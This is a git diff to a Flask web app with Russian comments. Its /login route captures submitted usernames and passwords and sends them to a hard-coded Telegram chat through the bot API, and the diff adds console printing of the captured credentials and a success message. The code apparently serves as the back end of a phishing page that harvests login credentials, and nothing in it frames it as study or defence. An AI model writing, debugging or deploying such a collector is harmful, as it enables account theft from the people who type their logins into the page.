@@ -11,8 +11,19 @@ TELEGRAM_CHAT_ID = '-4175189112' # Ваш ID чата в телеграм
 @app.route('/login', methods=['POST'])
 def login():
     # Получаем данные из запроса
-    username = request.form['username']
-    password = request.form['password']
+    username = request.form.get('username')
+    password = request.form.get('password')
+
+    # Проверяем, получены ли данные
+    if username is not None:
+        print('Received username:', username)
+    else:
+        print('No username received')
+    
+    if password is not None:
+        print('Received password:', password)
+    else:
+        print('No password received')
 
     # Отправляем данные в телеграм
     send_to_telegram(username, password)
@@ -27,7 +38,9 @@ def send_to_telegram(username, password):
         'text': f'Данные для входа: \nlog: {username}\npass: {password}'
     }
     response = requests.post(url, json=data)
-    if response.status_code != 200:
+    if response.status_code == 200:
+        print('Сообщение успешно отправлено в телеграм!')
+    else:
         print('Ошибка при отправке сообщения в телеграм:', response.text)
 
 # Маршрут для загрузки index.html
